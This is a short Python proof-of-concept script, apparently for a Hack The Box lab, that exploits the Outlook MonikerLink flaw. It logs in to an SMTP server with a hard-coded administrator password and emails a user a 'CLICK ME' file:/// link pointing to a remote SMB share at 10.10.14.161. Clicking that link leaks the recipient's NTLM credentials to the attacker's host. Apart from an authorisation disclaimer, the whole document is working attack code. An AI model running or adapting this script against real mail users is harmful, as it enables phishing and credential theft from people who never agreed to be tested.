'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.1 | 13/03/2024
Only run this on systems that you own or are explicitly authorised to test (in writing). Unauthorised scanning, testing or exploitation is illegal.
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

sender_email = 'administrator@mailing.htb' # Replace with your sender email address
receiver_email = 'maya@mailing.htb' # Replace with the recipient email address
password = 'homenetworkingadministrator'

url = '\\10.10.14.161\\test\\meeting'



message = MIMEMultipart('alternative')
message['Subject'] = 'meeting'
message["From"] = sender_email
message['To'] = receiver_email   

text = "Please read this email in HTML format."

html = f"""\
    <html>
    <body>
        <h1><a href="file:///{url}!meeting">CLICK ME.</a></h1>
    </body>
    </html>
"""

# Convert the HTML string into bytes and attach it to the message object
part1 = MIMEText(text, 'plain')
part2 = MIMEText(html, 'html')

message.attach(part1)
message.attach(part2)

print(message.as_string())

server = smtplib.SMTP('10.129.235.77',587) 
server.ehlo()
server.starttls()
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\nEmail delivered")
except Exception as error:
    print(error)
finally:
    server.quit()

